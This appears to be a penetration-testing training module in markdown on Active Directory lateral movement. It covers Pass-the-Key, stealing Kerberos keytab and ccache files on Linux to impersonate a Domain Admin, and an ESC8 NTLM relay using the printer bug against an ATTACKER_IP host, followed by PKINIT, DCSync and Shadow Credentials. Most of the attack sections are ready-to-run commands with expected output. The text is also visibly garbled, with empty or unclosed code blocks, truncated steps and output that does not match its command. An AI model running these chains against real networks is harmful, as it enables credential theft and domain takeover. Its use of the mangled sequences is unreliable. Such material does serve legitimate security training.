The traditional **Pass-the‚ÄëHash (PtH)** technique exploits NTLM hashes directly, bypassing Kerberos altogether by using the hash to authenticate via NTLM. In contrast, the **Pass‚Äëthe‚ÄëKey**, also known as **OverPass‚Äëthe‚ÄëHash**, leverages a user‚Äôs key‚Äîsuch as an NT hash (`RC4‚ÄëHMAC`) or AES key‚Äîto request a legitimate Kerberos TGT from the domain controller. This approach forges a **Ticket Granting Ticket (TGT)** without needing the user's plaintext password.

To forge our tickets, we need to have the user's hash.

<details>
<summary><h5>Mimikatz - Extract Kerberos keys</h5></summary>

**Start Mimikatz as Adminitrator**

```

> **NOTE:** Rubeus doesn't require administrative rights to perform the Pass the Key.

<summary><h4>Pass The Ticket with PowerShell Remoting (Windows)</h4></summary>

[PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.5&viewFallbackFrom=powershell-7.2) enables administrators to execute scripts or manage commands remotely on Windows systems. It's powered by WinRM, which operates using the WS‚ÄëManagement (WS‚ÄëMan) protocol and listens on two primary ports:

* **TCP 5985 for HTTP**
* **TCP 5986 for HTTPS (SSL/TLS-secured)**

To initiate a PowerShell Remoting session on a remote system, a user must meet one of the following criteria:

* Be a member of the local Administrators group
* Belong to the Remote Management Users group
* Have explicit permissions set on the session configuration within PowerShell

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). By default, the process is hidden; use the /show flag to display it. This prevents the erasure of existing TGTs for the current logon session.

<summary><h3>PtT from Linux</h3></summary>

If a Linux machine is joined to Active Directory and uses Kerberos for authentication, tickets might be stored in one of several ways‚Äîdepending on configuration and tooling 

> **Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.


<details>
<summary><h4>Introduction</h4></summary>

TGT/TGS Request Flow is the same across Windows and Linux, but storage mechanisms differ based on OS and configuration. In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable **KRB5CCNAME**. These ccache files are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?id=kb_article_view&sysparm_article=KB0024956) files. A keytab is a file that stores one or more Kerberos principals (user or service identities) paired with their encrypted keys‚Äîthe keys are derived from the principal‚Äôs password and used during authentication without prompting the user for credentials. When a user changes their password, all keytab files associated with that principal must be recreated, because the encrypted keys within depend on the current password.

Typical uses of keytab files include:

* Letting services or scripts authenticate asutomatically to Kerberos without plain-text passwords or interactive login 
* Enabling scheduled or background processes to access network resources (e.g., mounting SMB shares) via Kerberos.

> **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.<CORP.RTH>`

</details>

<details>
<summary><h4>1. Identify Domain Integration</h4></summary>

<details>
<summary><h5>Option 1: realm</h5></summary>

The [realm](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) utility is designed for domain discovery, enrollment, and managing which domain users or groups can access the local system.

**Check if Linux machine is domain-joined:**

```bash
realm list
```

**Expected output:**

```bash
# <corp.rth>
#   type: kerberos
#   realm-name: <CORP.RTH>
#   domain-name: <corp.rth>
#   configured: kerberos-member
#   server-software: active-directory
#   client-software: sssd
#   required-package: sssd-tools
#   required-package: sssd
#   required-package: libnss-sss
#   required-package: libpam-sss
#   required-package: adcli
#   required-package: samba-common-bin
#   login-formats: %U@<corp.rth>
#   login-policy: allow-permitted-logins
#   permitted-logins: david@<corp.rth>, julio@<corp.rth>
#   permitted-groups: Linux Admins
```

**Key Findings from realm list**

1. Domain Join Configuration
    * Domain: domain
    * Realm: DOMAIN (Kerberos realm)
    * Type: kerberos
    * Server Software: active-directory (Windows AD)
    * Client Software: sssd (Linux-side authentication)

2. Authentication Setup
    * Required Packages:
        * `sssd-tools`, `sssd` (core SSSD services)
        * `libnss-sss` (Name Service Switch integration)
        * `libpam-sss` (PAM module for AD logins)
        * `adcli` (AD command-line tools)
        * `samba-common-bin` (Samba utilities, though Winbind isn‚Äôt primary)

3. Login Policies
    * Login Format: `user@domain`
    * Explicitly allowed users:
        * david@domain
        * julio@domain
    * Permitted Groups: `Linux Admins` (members of this AD group can log in)

</details>

<details>
<summary><h5>Option 2: PS</h5></summary>

**Check if Linux machine is domain-joined:**

```bash
ps -ef | grep -i "winbind\|sssd"
```

**Expected output:**

```bash
# root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
# root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files

# david@i+   16815   16801  0 18:01 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
```

**Key Findings from the ps Output**

1. sssd (System Security Services Daemon) is Running
    * `/usr/sbin/sssd -i`
        * Main SSSD process
    * `/usr/libexec/sssd/sssd_be`
        * Backend service, handles AD/LDAP communication
    * `/usr/libexec/sssd/sssd_nss`
        * Name Service Switch integration for AD users/groups
    * `/usr/libexec/sssd/sssd_pam`
        * Pluggable Authentication Module for AD logins
    * `/usr/libexec/sssd/sssd_pac`
        * Handles Kerberos PAC validation for AD trusts

2. Domain Configuration
    * The `--domain` flag in `sssd_be` explicitly shows the AD domain this machine is joined to.

3. No `winbind` (Samba) Process
    * The machine uses SSSD (not Samba/Winbind) for AD integration, which is common for modern Linux-AD joins.

<summary><h4>2. Locate Kerberos Credentials</h4></summary>

On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings.

<details>
<summary><h5>Finding KeyTab files</h5></summary>

**Use Find to search for files with keytab in the name:**

```bash
find / -name *keytab* -ls 2>/dev/null
```

**Expected output:**

```bash
# 131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab

```

</details>

<details>
<summary><h5>Identifying KeyTab files in Cronjobs</h5></summary>

**Step 1: Identify KeyTab files in Cronjobs:**

```bash
crontab -l
```

**Expected output:**

```bash
# m h  dom mon dow   command
# *5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
```

**Step 2: Inspect script for KeyTab usage:**

```bash
cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
```

**Expected output:**

```bash
#!/bin/bash

# kinit svc_workstations@<CORP.RTH> -k -t /home/carlos@<corp.rth>/.scripts/svc_workstations.kt
# smbclient //dc01.<corp.rth>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<corp.rth>/script-test-results.txt
```

</details>

<details>
<summary><h5>Finding ccache files</h5></summary>

<details>
<summary><h5>Reviewing environment variables for ccache files</h5></summary>

**Identify the location of our Kerberos credentials cache:**

```bash
env | grep -i krb5
```

**Expected output:**

```bash
# KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

</details>

<details>
<summary><h5>Searching for ccache files in /tmp</h5></summary>

Ccache files are located, by default, at `/tmp`.

**1. Read information from a keytab file:**

```bash
ls -la /tmp
```

**Expected output:**

```bash
# total 68
# drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
# drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
# -rw-------  1 julio@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
# -rw-------  1 david@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
# -rw-------  1 carlos@<corp.rth> domain users@<corp.rth> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

We can now impersonate the user with kinit.

> **Note:** `kinit` is case-sensitive‚Äîensure you enter the principal exactly as shown in klist. For example, if the keytab shows the username in lowercase and the realm in uppercase, you must match that casing exactly.

</details>

</details>

</details>

<details>
<summary><h4>3. Backup Existing Tickets (Optional but recommended)</h4></summary>

Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.

**Create the backup**

```bash
echo $KRB5CCNAME
cp "$KRB5CCNAME" /tmp/backup_ccache
```

This lets you restore the original ticket later, preserving session continuity and credentials.

</details>

<details>
<summary><h4>4. Extract Credentials</h4></summary>

A keytab file lists one or more Kerberos principals along with their encrypted secret keys (derived from the user password). To use a keytab file, we need to know which user it was created for.

<details>
<summary><h5>Keytab Files</h5></summary>

<details>
<summary><h6>Option 1: Accessing Domain Shares via Impersonation</h6></summary>

**Step 1: Verify the current Kerberos ticket**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
# Default principal: david@<corp.rth>

# Valid starting     Expires            Service principal
# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<CORP.RTH>@<CORP.RTH>
#         renew until 10/07/25 17:02:11
```

> **Note:** At this point, the active user is david.

---

**Step 2: Authenticate using the specified keytab, without entering a password.**

```bash
kinit carlos@<CORP.RTH> -k -t /opt/specialfiles/carlos.keytab
```

**Step 3: Confirm the change:**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
# Default principal: carlos@<CORP.RTH>

# Valid starting     Expires            Service principal
# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<CORP.RTH>@<CORP.RTH>
```

> **Note:** The active principal is now carlos, indicating the ticket switched successfully.

---

**Step 4: Connecting to SMB Share as Carlos:**

```bash
smbclient //dc01/carlos -k -c ls
```

**Expected Output:**

```bash
#   .                                   D        0  Thu Oct  6 14:46:26 2022

#         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

---

**Step 2: Crack the password**

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

> **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.

---

**Step 3: Log in as the desired user**

```bash
su - carlos@<corp.rth>
```

**Step 4: Obtain more hashes**

The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.

<summary><h5>Ccache</h5></summary>

To abuse a `.ccache` file, we only need read access. These files are typically stored in `/tmp` and are readable only by the user who created them. However, if we obtain root access, we can read and leverage these files.

After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.

**Step 1: Connect to Target**

```bash
ssh svc_workstations@<corp.rth>@<IP> -p <PORT_TO_FORWARD>
```

**Step 2: Check Sudo Permissions**

```bash
sudo -l
```

**Step 3: Elevate to Root**

```bash
sudo su
```

**Step 4: Verify Access**

```bash
whoami
```

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

**Step 5: Search `/tmp` Directory**

```bash
ls -la /tmp
```

**Expected Output:**

```bash
# total 76
# drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
# drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..

```

If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

---

**Step 6: Check Group Membership**

```bash
id julio@<corp.rth>
```

**Expected Output:**

```bash
# uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
```

Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.

To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.

**Step 7: Prepare Environment**

```bash
cp /tmp/krb5cc_647401106_HRJDux .
export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
```

**Step 8: Verify Ticket**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/root/krb5cc_647401106_I8I133
# Default principal: julio@<CORP.RTH>

# Valid starting       Expires              Service principal

#         renew until 10/08/2025 13:25:01
```

> **Note:** Check "Valid starting" and "Expires" times

**Step 9: Access Domain Resources**

```bash
smbclient //dc01/C$ -k -c ls -no-pass
```

**Expected Output:**

```bash

> **NOTE:** `klist` displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

<summary><h4>5. (Optional) Use Attack Tools with Kerberos</h4></summary>

Many Linux-based attack tools that interact with Windows and Active Directory environments support Kerberos authentication. When using these tools from a domain-joined machine, it's important to set the `KRB5CCNAME` environment variable to point to the correct ccache file.

However, if we're attacking from a non-domain-joined machine‚Äîsuch as our external attack host‚Äîwe must ensure that the system can reach the Key Distribution Center (KDC) or Domain Controller, and that domain name resolution is functioning correctly.

In our case, the attack host cannot directly connect to the **KDC** or resolve domain names through the **Domain Controller**. To enable Kerberos-based attacks in this scenario, we need to proxy traffic through an internal host (e.g., **MS01**) using tools like [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains). Additionally, we must manually configure the `/etc/hosts` file to map domain names and target machine hostnames to their corresponding IP addresses.

---

**Modify `/etc/hosts`:**

```bash
echo "<DC01_IP> <corp.rth> dc01.<corp.rth> dc01" | sudo tee -a /etc/hosts
echo "<MS01_IP> ms01.<corp.rth> ms01" | sudo tee -a /etc/hosts
```

**Confirm Changes:**

```bash
cat /etc/hosts
```

**Expected Output**

```bash
# Host addresses

# <IP> <corp.rth> dc01.<corp.rth> dc01
# <IP> ms01.<corp.rth> ms01
```

**Modify `/etc/proxychains.conf`:**

```bash
sudo sed -i '/^\[ProxyList\]/,$c\[ProxyList]\nsocks5 127.0.0.1 1080' /etc/proxychains.conf
```

**Confirm Changes:**

```bash
cat /etc/proxychains.conf
```

**Expected Output**

```bash
# [ProxyList]
# socks5 127.0.0.1 1080
```

---

**Download Chisel to our attack host**

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

**Expected Output**

```bash
# 2025/10/10 07:26:15 server: Reverse tunneling enabled
# 2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
# 2025/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

---

**Connect to MS01 with xfreerdp**

```bash
xfreerdp /v:<IP> /u:<USER> /d:<corp.rth> /p:<PASSWORD> /dynamic-resolution
```

---

**Execute chisel from MS01**

```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

**Expected Output**

```cmd
2025/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2025/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

---

**Setting the KRB5CCNAME environment variable**

```bash
export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
```

> **Note:** If you are not familiar with file transfer operations, check out the module [FILE TRANSFERS](./04-file-transfers.md).

---

<details>
<summary><h5>Impacket (with proxychains if needed)</h5></summary>

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.

**Use Impacket with proxychains and Kerberos authentication**

```bash
proxychains impacket-wmiexec dc01 -k
```

**Expected Output**

```bash
# [proxychains] config file found: /etc/proxychains.conf

> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

</details>

<details>
<summary><h5>Evil-WinRM</h5></summary>

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name, and the KDC is the DC01.

**Install Kerberos authentication package**

```bash
sudo apt-get install krb5-user -y
```

In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:

**Kerberos configuration file:**


```bash
# [libdefaults]
#         default_realm = <CORP.RTH>

# ...

# [realms]
#     <CORP.RTH> = {
#         kdc = dc01.<corp.rth>
#     }

# ...
```

**Use Evil-WinRM with Kerberos**

```bash
proxychains evil-winrm -i dc01 -r <corp.rth>
```

**Expected Output**

```bash
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.14

# Evil-WinRM shell v3.3
# ...
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
```

**Confirm current user**

```powershell
*Evil-WinRM* PS C:\Users\julio\Documents> whoami
```

**Expected Output**

```powershell
<corp.rth>\julio
```

**Confirm current host**

```powershell
*Evil-WinRM* PS C:\Users\julio\Documents> hostname
```

**Expected Output**

```powershell

<summary><h4>6. (Optional) Convert Ticket Formats</h4></summary>

If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

<summary><h4>8. (Optional) Use Linikatz for Automated Extraction</h4></summary>

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a credential dumping tool developed by Cisco‚Äôs security team, designed to exploit Linux systems integrated with Active Directory. It brings the same concept as Mimikatz, but tailored for UNIX environments.

Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it extracts credentials‚Äîincluding Kerberos tickets‚Äîfrom various implementations such as FreeIPA, SSSD, Samba, and Vintella. The dumped credentials are stored in a folder prefixed with linikatz. and are available in multiple formats, including ccache and keytab.

**Download Linikatz**

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
```

**Run Linikatz**

```bash
bash linikatz.sh

<summary><h2>Pass the Certificate</h2></summary>

[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for Public Key Cryptography for Initial Authentication, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. Pass-the-Certificate refers to the technique of using X.509 certificates to successfully obtain Ticket Granting Tickets (TGTs). This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

<summary><h3>AD CS NTLM Relay Attack (ESC8)</h3></summary>

ESC8‚Äîas described in the [`Certified Pre-Owned`](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) paper‚Äîis an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, including web enrollment, which by default occurs over HTTP.

Attackers can enumerate the certificate template which is used by Domain Controllers for authentication with tools like [`certipy`](https://github.com/ly4k/Certipy?tab=readme-ov-file), and use Impacket‚Äôs [`ntlmrelayx`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service.

**Enumerate the certificate template**

```bash
certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
```

**Run impacket-ntlmrelayx** 

```bash
impacket-ntlmrelayx -t http://<IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> **Note:** The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication.

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces **DC01_IP** to attempt authentication against **ATTACKER_IP**:

**Run printerbug.py**

```bash
python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
```

**Expected output**

```bash
# [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [*] Attempting to trigger authentication via rprn RPC at <DC01_IP>
# [*] Bind OK
# [*] Got handle
# RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
# [*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for **DC01$**:

```bash
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

```

We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).

**Install oscrypto**

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

**Clone the repository and install the dependencies**

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

>Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

**Run PKINIT**

```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
```

**Expected Output**

```bash

# 2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
# INFO:minikerberos:Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP.RTH>/DC01$'@DC01.<CORP.RTH>
```

**Expected Output**

```bash
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
```

</details>

<details>
<summary><h3>Shadow Credentials (msDS-KeyCredentialLink)</h3></summary>

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. 

**Generate a X.509 certificate and write the public key to the victim user's msDS-KeyCredentialLink attribute**

```bash
pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <USER> --action add
```

**Expected Output**

```bash
# [*] Searching for the target account
# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=<corp>,DC=local
# [*] Generating certificate
# [*] Certificate generated
# [*] Generating KeyCredential
# [*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
# [*] Updating the msDS-KeyCredentialLink attribute of <USER>
# [+] Updated the msDS-KeyCredentialLink attribute of the target object
# [*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
# [+] PFX exportiert nach: eFUVVTPf.pfx
# [i] Passwort f√ºr PFX: bmRH4LK7UwPrAOfvIx6W
# [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
# [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
# [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown.

**Use this file with gettgtpkinit.py to acquire a TGT as the victim**

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
```

**Expected Output**

```bash
# 2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
# INFO:minikerberos:Loading certificate and key from file

# 2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
# INFO:minikerberos:Saved TGT to file
```

**With the TGT obtained, we may once again pass the ticket**

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

**Expected Output**

```bash
# Ticket cache: FILE:/tmp/jpinkman.ccache
# Default principal: jpinkman@<CORP.LOCAL>

# Valid starting       Expires              Service principal
# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/<CORP.LOCAL>@<CORP.LOCAL>
```

In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```bash
evil-winrm -i dc01.<corp.local> -r <corp.local>
```

**Expected Output:**

```bash
# Evil-WinRM shell v3.7

# Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

# Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

# Info: Establishing connection to remote endpoint
# *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami

```

<summary><h3>No PKINIT?</h3></summary>

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://github.com/AlmondOffSec/PassTheCert/).

Now that we've seen how to perform various lateral movement techniques from Windows and Linux hosts, we'll pivot to a new focus: password management.
